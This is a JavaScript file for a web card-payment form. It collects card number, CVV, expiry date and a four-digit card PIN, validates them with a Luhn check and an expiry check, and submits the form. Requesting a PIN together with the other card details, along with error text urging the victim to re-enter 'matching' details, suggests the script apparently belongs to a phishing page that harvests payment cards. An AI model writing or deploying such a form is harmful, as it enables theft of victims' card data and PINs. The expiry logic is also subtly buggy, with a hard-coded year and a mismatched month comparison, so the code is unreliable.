card = document.getElementById("card");
cvv = document.getElementById("cvv");
exp = document.getElementById("exp");
pin = document.getElementById("pin");

error = document.getElementById("error");

btn = document.getElementById("btn");
form = document.getElementById("form");

function validateCC(inputNum) {
    var digit, digits, flag, sum, _i, _len;
    flag = true;
    sum = 0;
    digits = (inputNum + '').split('').reverse();
    for (_i = 0, _len = digits.length; _i < _len; _i++) {
        digit = digits[_i];
        digit = parseInt(digit, 10);
        if ((flag = !flag)) {
        digit *= 2;
        }
        if (digit > 9) {
        digit -= 9;
        }
        sum += digit;
    }
    return sum % 10 === 0;
};

function checkExp(exp) {
    if (exp.substring(3, 5) == new Date().getFullYear().toString().substr(2,2)) {
        if (exp.substring(0, 2) < new Date().getMonth()) {
            return false;
        } else {
            return true;
        }
    } else {
        if (exp.substring(3, 5) < 21) {
            return false;
        } else {
            return true;
        }
    }
}

new Cleave(card, {
    creditCard: 1
});

new Cleave(exp, {
    date: true,
    datePattern: ['m', 'y']
});

new Cleave(cvv, {
    numericOnly: 1,
    delimiter: '-',
    blocks: [4]
});

new Cleave(pin, {
    numericOnly: 1,
    blocks: [4]
});

card.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length >= 3 &&
        cvv.value.trim() != "" &&
        pin.value.trim() != "" &&
        pin.value.trim().length == 4
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

exp.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length >= 3 &&
        cvv.value.trim() != "" &&
        pin.value.trim() != "" &&
        pin.value.trim().length == 4
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

cvv.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length >= 3 &&
        cvv.value.trim() != "" &&
        pin.value.trim() != "" &&
        pin.value.trim().length == 4
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

pin.addEventListener("keyup", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length >= 3 &&
        cvv.value.trim() != "" &&
        pin.value.trim() != "" &&
        pin.value.trim().length == 4
    ) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
});

btn.addEventListener("click", () => {
    if (
        card.value.trim() != "" &&
        exp.value.trim() != "" &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length >= 3 &&
        cvv.value.trim() != "" &&
        pin.value.trim() != "" &&
        pin.value.trim().length == 4
    ) {
        if (validateCC(card.value.replace(/ /g, ""))) {
            if (
                checkExp(exp.value.trim())
            ) {
                form.submit();
            } else {
                error.innerHTML = '<div class="error-message show-error error">Your card is expired.</div>';
            }
        } else {
            error.innerHTML = '<div class="error-message show-error error">Your card does not match with our records, please try again.</div>';
        }
    }
});